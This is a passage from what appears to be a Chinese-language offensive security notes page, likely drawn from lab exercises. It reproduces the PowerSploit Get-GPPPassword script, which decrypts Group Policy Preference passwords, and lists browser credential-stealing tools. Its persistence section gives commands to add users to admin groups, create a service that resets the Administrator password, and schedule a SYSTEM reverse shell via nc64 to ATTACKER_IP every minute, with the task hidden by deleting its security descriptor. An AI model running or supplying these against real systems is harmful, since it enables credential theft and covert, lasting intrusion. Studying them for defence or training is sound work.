class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-GPPPassword</span></span> &#123;<br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">检索通过组策略首选项推送的账户的明文密码和其他信息。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PowerSploit 函数: Get-GPPPassword  </span><br><span class="hljs-comment">作者: Chris Campbell (@obscuresec)  </span><br><span class="hljs-comment">许可证: BSD 3-Clause  </span><br><span class="hljs-comment">必要依赖项: 无  </span><br><span class="hljs-comment">可选依赖项: 无  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Get-GPPPassword 在域控制器上搜索 groups.xml、scheduledtasks.xml、services.xml 和 datasources.xml，并返回明文密码。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Server</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">指定要搜索的域控制器。</span><br><span class="hljs-comment">默认为用户当前所在的域。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SearchForest</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">映射所有可访问的信任关系，并搜索所有可访问的 SYSVOL。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Get-GPPPassword</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : [BLANK]</span><br><span class="hljs-comment">Changed   : &#123;2014-02-21 05:28:53&#125;</span><br><span class="hljs-comment">Passwords : &#123;password12&#125;</span><br><span class="hljs-comment">UserNames : &#123;test1&#125;</span><br><span class="hljs-comment">File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : &#123;mspresenters&#125;</span><br><span class="hljs-comment">Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span><br><span class="hljs-comment">Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span><br><span class="hljs-comment">UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span><br><span class="hljs-comment">File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : [BLANK]</span><br><span class="hljs-comment">Changed   : &#123;2014-02-21 05:29:53, 2014-02-21 05:29:52&#125;</span><br><span class="hljs-comment">Passwords : &#123;password, password1234$&#125;</span><br><span class="hljs-comment">UserNames : &#123;administrator, admin&#125;</span><br><span class="hljs-comment">File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : [BLANK]</span><br><span class="hljs-comment">Changed   : &#123;2014-02-21 05:30:14, 2014-02-21 05:30:36&#125;</span><br><span class="hljs-comment">Passwords : &#123;password, read123&#125;</span><br><span class="hljs-comment">UserNames : &#123;DEMO\Administrator, admin&#125;</span><br><span class="hljs-comment">File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Services\Services.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Get-GPPPassword -Server EXAMPLE.COM</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : [BLANK]</span><br><span class="hljs-comment">Changed   : &#123;2014-02-21 05:28:53&#125;</span><br><span class="hljs-comment">Passwords : &#123;password12&#125;</span><br><span class="hljs-comment">UserNames : &#123;test1&#125;</span><br><span class="hljs-comment">File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB982DA&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">NewName   : &#123;mspresenters&#125;</span><br><span class="hljs-comment">Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span><br><span class="hljs-comment">Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span><br><span class="hljs-comment">UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span><br><span class="hljs-comment">File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB9AB12&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Get-GPPPassword | ForEach-Object &#123;$_.passwords&#125; | Sort-Object -Uniq</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">password</span><br><span class="hljs-comment">password12</span><br><span class="hljs-comment">password123</span><br><span class="hljs-comment">password1234</span><br><span class="hljs-comment">password1234$</span><br><span class="hljs-comment">read123</span><br><span class="hljs-comment">Recycling*3ftw!</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html</span><br><span class="hljs-comment">https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1</span><br><span class="hljs-comment">http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences</span><br><span class="hljs-comment">http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html</span><br><span class="hljs-comment">#&gt;</span><br><br>    <span class="hljs-comment"># 禁用关于 WMICmdlet、ShouldProcess 和 PlainTextForPassword 的警告</span><br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSAvoidUsingWMICmdlet&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSShouldProcess&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSAvoidUsingPlainTextForPassword&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">ValidateNotNullOrEmpty</span>()]<br>        [<span class="hljs-built_in">String</span>]<br>        <span class="hljs-variable">$Server</span> = <span class="hljs-variable">$Env:USERDNSDOMAIN</span>,<br><br>        [<span class="hljs-type">Switch</span>]<br>        <span class="hljs-variable">$SearchForest</span><br>    )<br><br>    <span class="hljs-comment"># 定义用于解码和解密密码的辅助函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-DecryptedCpassword</span></span> &#123;<br>        <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>        <span class="hljs-keyword">Param</span> (<br>            [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$Cpassword</span><br>        )<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment"># 根据字符串长度附加适当的填充</span><br>            <span class="hljs-variable">$Mod</span> = (<span class="hljs-variable">$Cpassword</span>.length % <span class="hljs-number">4</span>)<br><br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$Mod</span>) &#123;<br>                <span class="hljs-string">&#x27;1&#x27;</span> &#123;<span class="hljs-variable">$Cpassword</span> = <span class="hljs-variable">$Cpassword</span>.Substring(<span class="hljs-number">0</span>,<span class="hljs-variable">$Cpassword</span>.Length <span class="hljs-literal">-1</span>)&#125;<br>                <span class="hljs-string">&#x27;2&#x27;</span> &#123;<span class="hljs-variable">$Cpassword</span> += (<span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - <span class="hljs-variable">$Mod</span>))&#125;<br>                <span class="hljs-string">&#x27;3&#x27;</span> &#123;<span class="hljs-variable">$Cpassword</span> += (<span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - <span class="hljs-variable">$Mod</span>))&#125;<br>            &#125;<br><br>            <span class="hljs-variable">$Base64Decoded</span> = [<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$Cpassword</span>)<br>            <br>            <span class="hljs-comment"># 确保加载了 System.Core</span><br>            [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Core&quot;</span>) |<span class="hljs-built_in">Out-Null</span><br><br>            <span class="hljs-comment"># 创建新的 AES .NET 加密对象</span><br>            <span class="hljs-variable">$AesObject</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider<br>            [<span class="hljs-built_in">Byte</span>[]] <span class="hljs-variable">$AesKey</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>x4e,<span class="hljs-number">0</span>x99,<span class="hljs-number">0</span>x06,<span class="hljs-number">0</span>xe8,<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>xfa,<span class="hljs-number">0</span>xf4,<span class="hljs-number">0</span>x93,<span class="hljs-number">0</span>x10,<span class="hljs-number">0</span>x62,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xfe,<span class="hljs-number">0</span>xe8,<br>                                 <span class="hljs-number">0</span>xf4,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>xe8,<span class="hljs-number">0</span>x06,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>x05,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x90,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x9b,<span class="hljs-number">0</span>x09,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>x33,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>x1b)<br><br>            <span class="hljs-comment"># 设置 IV 为全零以防止动态生成 IV 值</span><br>            <span class="hljs-variable">$AesIV</span> = <span class="hljs-built_in">New-Object</span> Byte[](<span class="hljs-variable">$AesObject</span>.IV.Length)<br>            <span class="hljs-variable">$AesObject</span>.IV = <span class="hljs-variable">$AesIV</span><br>            <span class="hljs-variable">$AesObject</span>.Key = <span class="hljs-variable">$AesKey</span><br>            <span class="hljs-variable">$DecryptorObject</span> = <span class="hljs-variable">$AesObject</span>.CreateDecryptor()<br>            [<span class="hljs-built_in">Byte</span>[]] <span class="hljs-variable">$OutBlock</span> = <span class="hljs-variable">$DecryptorObject</span>.TransformFinalBlock(<span class="hljs-variable">$Base64Decoded</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Base64Decoded</span>.length)<br><br>            <span class="hljs-keyword">return</span> [<span class="hljs-type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="hljs-variable">$OutBlock</span>)<br>        &#125;<br><br>        <span class="hljs-keyword">catch</span> &#123; <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$Error</span>[<span class="hljs-number">0</span>] &#125;<br>    &#125;<br><br>    <span class="hljs-comment"># 解析 XML 文件中的字段的辅助函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-GPPInnerField</span></span> &#123;<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>        <span class="hljs-keyword">Param</span> (<br>            <span class="hljs-variable">$File</span><br>        )<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$Filename</span> = <span class="hljs-built_in">Split-Path</span> <span class="hljs-variable">$File</span> <span class="hljs-literal">-Leaf</span><br>            [<span class="hljs-built_in">xml</span>] <span class="hljs-variable">$Xml</span> = <span class="hljs-built_in">Get-Content</span> (<span class="hljs-variable">$File</span>)<br><br>            <span class="hljs-comment"># 检查是否存在 cpassword 字段</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Xml</span>.innerxml <span class="hljs-operator">-match</span> <span class="hljs-string">&#x27;cpassword&#x27;</span>) &#123;<br><br>                <span class="hljs-variable">$Xml</span>.GetElementsByTagName(<span class="hljs-string">&#x27;Properties&#x27;</span>) | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_</span>.cpassword) &#123;<br>                        <span class="hljs-variable">$Cpassword</span> = <span class="hljs-variable">$_</span>.cpassword<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Cpassword</span> <span class="hljs-operator">-and</span> (<span class="hljs-variable">$Cpassword</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>                           <span class="hljs-variable">$DecryptedPassword</span> = <span class="hljs-built_in">Get-DecryptedCpassword</span> <span class="hljs-variable">$Cpassword</span><br>                           <span class="hljs-variable">$Password</span> = <span class="hljs-variable">$DecryptedPassword</span><br>                           <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPInnerField] 已解密密码：&#x27;<span class="hljs-variable">$File</span>&#x27;&quot;</span><br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_</span>.newName) &#123;<br>                            <span class="hljs-variable">$NewName</span> = <span class="hljs-variable">$_</span>.newName<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_</span>.userName) &#123;<br>                            <span class="hljs-variable">$UserName</span> = <span class="hljs-variable">$_</span>.userName<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_</span>.accountName) &#123;<br>                            <span class="hljs-variable">$UserName</span> = <span class="hljs-variable">$_</span>.accountName<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_</span>.runAs) &#123;<br>                            <span class="hljs-variable">$UserName</span> = <span class="hljs-variable">$_</span>.runAs<br>                        &#125;<br><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-variable">$Changed</span> = <span class="hljs-variable">$_</span>.ParentNode.changed<br>                        &#125;<br>                        <span class="hljs-keyword">catch</span> &#123;<br>                            <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPInnerField] 无法检索 ParentNode.changed 字段：&#x27;<span class="hljs-variable">$File</span>&#x27;&quot;</span><br>                        &#125;<br><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-variable">$NodeName</span> = <span class="hljs-variable">$_</span>.ParentNode.ParentNode.LocalName<br>                        &#125;<br>                        <span class="hljs-keyword">catch</span> &#123;<br>                            <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPInnerField] 无法检索 ParentNode.ParentNode.LocalName 字段：&#x27;<span class="hljs-variable">$File</span>&#x27;&quot;</span><br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$Password</span>)) &#123;<span class="hljs-variable">$Password</span> = <span class="hljs-string">&#x27;[BLANK]&#x27;</span>&#125;<br>                        <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$UserName</span>)) &#123;<span class="hljs-variable">$UserName</span> = <span class="hljs-string">&#x27;[BLANK]&#x27;</span>&#125;<br>                        <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$Changed</span>)) &#123;<span class="hljs-variable">$Changed</span> = <span class="hljs-string">&#x27;[BLANK]&#x27;</span>&#125;<br>                        <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$NewName</span>)) &#123;<span class="hljs-variable">$NewName</span> = <span class="hljs-string">&#x27;[BLANK]&#x27;</span>&#125;<br><br>                        <span class="hljs-variable">$GPPPassword</span> = <span class="hljs-built_in">New-Object</span> PSObject <span class="hljs-literal">-Property</span> <span class="hljs-selector-tag">@</span>&#123;<br>                            <span class="hljs-string">&#x27;File&#x27;</span>       = <span class="hljs-variable">$File</span><br>                            <span class="hljs-string">&#x27;NewName&#x27;</span>    = <span class="hljs-variable">$NewName</span><br>                            <span class="hljs-string">&#x27;UserNames&#x27;</span>  = <span class="hljs-variable">$UserName</span><br>                            <span class="hljs-string">&#x27;Passwords&#x27;</span>  = <span class="hljs-variable">$Password</span><br>                            <span class="hljs-string">&#x27;Changed&#x27;</span>    = <span class="hljs-variable">$Changed</span><br>                        &#125;<br><br>                        <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$GPPPassword</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> &#123; <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPInnerField] 出现异常：<span class="hljs-variable">$Error</span>[0]&quot;</span> &#125;<br>    &#125;<br><br>    <span class="hljs-comment"># 定义搜索范围</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SearchForest</span>) &#123;<br>        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPPassword] 映射整个林信任关系...&quot;</span><br>        <span class="hljs-variable">$Forest</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetCurrentForest()<br>        <span class="hljs-variable">$Sysvols</span> = <span class="hljs-selector-tag">@</span>()<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Domain</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Forest</span>.Domains) &#123;<br>            <span class="hljs-variable">$Sysvols</span> += <span class="hljs-string">&quot;\\<span class="hljs-variable">$</span>(<span class="hljs-variable">$Domain</span>.name)\SYSVOL&quot;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment"># 设置搜索路径</span><br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-variable">$Sysvols</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;\\<span class="hljs-variable">$Server</span>\SYSVOL&quot;</span>) &#125;<br><br>    <span class="hljs-comment"># 搜索目标文件</span><br>    <span class="hljs-variable">$Files</span> = <span class="hljs-selector-tag">@</span>()<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Sysvol</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Sysvols</span>) &#123;<br>        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPPassword] 搜索 &#x27;<span class="hljs-variable">$Sysvol</span>&#x27;...&quot;</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$Files</span> += <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$Sysvol</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Groups.xml&quot;</span><br>            <span class="hljs-variable">$Files</span> += <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$Sysvol</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Services.xml&quot;</span><br>            <span class="hljs-variable">$Files</span> += <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$Sysvol</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Scheduledtasks.xml&quot;</span><br>            <span class="hljs-variable">$Files</span> += <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$Sysvol</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;DataSources.xml&quot;</span><br>        &#125;<br>        <span class="hljs-keyword">catch</span> &#123;<br>            <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[Get-GPPPassword] 无法获取文件：<span class="hljs-variable">$Error</span>[0]&quot;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment"># 检索并解密密码</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$File</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Files</span>) &#123;<br>        <span class="hljs-built_in">Get-GPPInnerField</span> <span class="hljs-operator">-File</span> <span class="hljs-variable">$File</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h5><p><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></p><p><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></p><p><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></p><p><a href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></p><p><a href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></p><p><a href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal</a></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="篡改非特权账户"><a href="#篡改非特权账户" class="headerlink" title="篡改非特权账户"></a>篡改非特权账户</h3><h4 id="分配组权限"><a href="#分配组权限" class="headerlink" title="分配组权限"></a>分配组权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net localgroup administrators thmuser0 /add<span class="hljs-comment"># 将thmuser0添加到administrators组</span><br>net localgroup <span class="hljs-string">&quot;Backup Operators&quot;</span> thmuser1 /add<span class="hljs-comment"># 将thmuser1添加到备份管理员组</span><br>net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> thmuser1 /add<span class="hljs-comment"># 将thmuser1添加到远程管理用户组</span><br></code></pre></td></tr></table></figure><h4 id="特殊权限和安全描述符"><a href="#特殊权限和安全描述符" class="headerlink" title="特殊权限和安全描述符"></a>特殊权限和安全描述符</h4><h4 id="RID劫持"><a href="#RID劫持" class="headerlink" title="RID劫持"></a>RID劫持</h4><h3 id="后门文件"><a href="#后门文件" class="headerlink" title="后门文件"></a>后门文件</h3><h4 id="可执行文件白加黑"><a href="#可执行文件白加黑" class="headerlink" title="可执行文件白加黑"></a>可执行文件白加黑</h4><h4 id="快捷方式文件"><a href="#快捷方式文件" class="headerlink" title="快捷方式文件"></a>快捷方式文件</h4><h4 id="劫持文件关联"><a href="#劫持文件关联" class="headerlink" title="劫持文件关联"></a>劫持文件关联</h4><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="创建后门服务"><a href="#创建后门服务" class="headerlink" title="创建后门服务"></a>创建后门服务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建并启动一个名为“THMservice”的服务,服务启动时，将执行“net user”命令，将管理员密码重置为Passwd123</span><br>sc.exe create THMservice binPath= <span class="hljs-string">&quot;net user Administrator Passwd123&quot;</span> <span class="hljs-built_in">start</span>= auto<br>sc.exe <span class="hljs-built_in">start</span> THMservice<br><br><span class="hljs-comment"># 创建运行后门文件的服务</span><br>sc.exe create THMservice2 binPath= <span class="hljs-string">&quot;C:\windows\rev-svc.exe&quot;</span> <span class="hljs-built_in">start</span>= auto<br>sc.exe <span class="hljs-built_in">start</span> THMservice2<br></code></pre></td></tr></table></figure><h4 id="修改现有服务"><a href="#修改现有服务" class="headerlink" title="修改现有服务"></a>修改现有服务</h4><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个每分钟运行一次反弹shell的任务</span><br>schtasks /create /<span class="hljs-built_in">sc</span> minute /mo <span class="hljs-number">1</span> /tn THM<span class="hljs-literal">-TaskBackdoor</span> /tr <span class="hljs-string">&quot;c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449&quot;</span> /ru SYSTEM<br><br><span class="hljs-comment"># 以SYSTEM权限打开Regedit</span><br>c:\tools\pstools\PsExec64.exe <span class="hljs-literal">-s</span> <span class="hljs-literal">-i</span> regedit<br></code></pre></td></tr></table></figure><p>然后在注册表中删除安全描述符SD(用于隐藏，避免被发现)</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250117132133778.png" alt="image-20250117132133778"></p><h3 id="登录触发"><a href="#登录触发" class="headerlink" title="登录触发"></a>登录触发</h3><h4 id="启动文件夹-Startup-folder"><a href="#启动文件夹-Startup-folder" class="headerlink" title="启动文件夹(Startup folder)"></a>启动文件夹(Startup folder)</h4><p><code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>放置用户登录时要运行的可执行文件</p><h4 id="Run-RunOnce"><a href="#Run-RunOnce" class="headerlink" title="Run / RunOnce"></a>Run / RunOnce</h4><p>注册表项</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce<br><br><span class="hljs-comment"># 